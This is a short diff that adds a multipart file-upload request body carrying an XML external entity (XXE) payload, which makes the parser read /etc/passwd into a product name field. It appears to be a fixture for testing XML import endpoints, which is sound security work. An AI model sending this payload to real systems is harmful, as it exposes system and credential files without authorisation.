@@ -1,0 +1,8 @@
+------AWA9f3c1aBoundary
+Content-Disposition: form-data; name="file"; filename="awa-xxe.xml"
+Content-Type: text/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE products [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<products><product><name>&xxe;</name><price>1.00</price><stock>1</stock></product></products>
+------AWA9f3c1aBoundary--
